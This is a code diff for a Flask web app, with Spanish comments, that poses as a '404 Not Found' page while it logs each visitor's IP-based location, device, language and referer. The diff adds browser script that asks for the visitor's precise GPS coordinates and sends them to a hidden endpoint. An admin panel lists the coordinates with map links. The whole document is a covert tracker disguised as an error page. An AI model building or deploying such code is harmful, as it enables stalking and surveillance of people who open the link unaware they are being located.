@@ -6,6 +6,7 @@ import os
 app = Flask(__name__)
 
 visitas = []
+gps_data = []  # 🔥 NUEVO (para guardar GPS)
 
 # 🔐 Credenciales
 USUARIO = os.environ.get("USER", "admin")
@@ -59,7 +60,7 @@ def detectar_dispositivo(user_agent):
     else:
         return "💻 PC"
 
-# 🏠 Página principal (404)
+# 🏠 Página principal (404 + script GPS)
 @app.route("/")
 def inicio():
     ip = obtener_ip_real()
@@ -70,7 +71,6 @@ def inicio():
     user_agent = request.headers.get('User-Agent', 'N/A')
     idioma = request.headers.get('Accept-Language', 'N/A')
     referer = request.headers.get('Referer', 'Directo')
-
     dispositivo = detectar_dispositivo(user_agent)
 
     mapa = f"https://www.google.com/maps?q={info['lat']},{info['lon']}"
@@ -85,20 +85,55 @@ def inicio():
         "lat": info["lat"],
         "lon": info["lon"],
         "mapa": mapa,
-        "user_agent": user_agent,
+        "dispositivo": dispositivo,
         "idioma": idioma,
         "referer": referer,
-        "dispositivo": dispositivo
+        "user_agent": user_agent
     })
 
-    return "<h1>404 Not Found</h1>", 404
+    # 🔥 SCRIPT GPS
+    return """
+    <h1>404 Not Found</h1>
 
-# 🔐 Panel admin
+    <script>
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(pos) {
+            fetch("/guardar_gps", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    lat: pos.coords.latitude,
+                    lon: pos.coords.longitude
+                })
+            });
+        });
+    }
+    </script>
+    """, 404
+
+# 📍 GUARDAR GPS
+@app.route("/guardar_gps", methods=["POST"])
+def guardar_gps():
+    data = request.json
+    fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    gps_data.append({
+        "lat": data.get("lat"),
+        "lon": data.get("lon"),
+        "fecha": fecha
+    })
+
+    return "OK"
+
+# 🔐 PANEL ADMIN
 @app.route("/admin")
 @require_auth
 def admin():
-    tabla = ""
 
+    # 🔹 TABLA IP
+    tabla = ""
     for v in visitas:
         tabla += f"""
         <tr>
@@ -113,12 +148,26 @@ def admin():
             <td>{v['dispositivo']}</td>
             <td>{v['idioma']}</td>
             <td>{v['referer']}</td>
-            <td style="max-width:200px;overflow:auto;">{v['user_agent']}</td>
+        </tr>
+        """
+
+    # 🔹 TABLA GPS
+    tabla_gps = ""
+    for g in gps_data:
+        link = f"https://www.google.com/maps?q={g['lat']},{g['lon']}"
+        tabla_gps += f"""
+        <tr>
+            <td>{g['lat']}</td>
+            <td>{g['lon']}</td>
+            <td>{g['fecha']}</td>
+            <td><a href="{link}" target="_blank">📍 Ver</a></td>
         </tr>
         """
 
     return f"""
     <h1>Panel Avanzado 🔐</h1>
+
+    <h2>🌐 Datos por IP</h2>
     <table border="1">
         <tr>
             <th>IP</th>
@@ -132,12 +181,24 @@ def admin():
             <th>Dispositivo</th>
             <th>Idioma</th>
             <th>Referer</th>
-            <th>User-Agent</th>
         </tr>
         {tabla}
     </table>
+
+    <br><br>
+
+    <h2>📍 GPS (Preciso)</h2>
+    <table border="1">
+        <tr>
+            <th>Latitud</th>
+            <th>Longitud</th>
+            <th>Fecha</th>
+            <th>Mapa</th>
+        </tr>
+        {tabla_gps}
+    </table>
     """
 
-# 🚀 Run
+# 🚀 RUN
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
